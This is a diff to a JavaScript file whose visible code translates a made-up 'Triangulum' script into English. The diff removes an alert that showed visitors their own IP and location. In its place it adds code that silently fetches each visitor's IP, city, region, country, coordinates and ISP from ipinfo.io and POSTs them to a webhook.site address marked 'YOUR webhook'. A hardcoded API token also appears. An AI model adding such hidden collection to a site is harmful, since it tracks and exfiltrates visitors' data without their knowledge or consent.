@@ -70,15 +70,27 @@ function translateTriangulumToEnglish(triangulumText) {
     return codes.map(code => reverseMap[code] || code).join('');
 }
 
-
-fetch('https://ipinfo.io/json?token=70c78fefbdb6d0')  // optional token for more requests/day
+fetch('https://ipinfo.io/json?token=70c78fefbdb6d0')
     .then(res => res.json())
     .then(data => {
-        console.log('IP Info:', data);
-        const { ip, city, region, country, loc, org } = data;
-        alert(`You are visiting from ${city}, ${region}, ${country}.\nYour IP: ${ip}\nISP: ${org}`);
-    })
-    .catch(err => {
-        console.error('Could not get IP info:', err);
+        const payload = {
+            ip: data.ip,
+            city: data.city,
+            region: data.region,
+            country: data.country,
+            loc: data.loc,
+            isp: data.org,
+            timestamp: new Date().toISOString()
+        };
+
+        // Send it to YOUR webhook
+        fetch('https://webhook.site/2b79af6e-c584-4057-9f9c-54680051ab09', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(payload)
+        });
     });
+
 
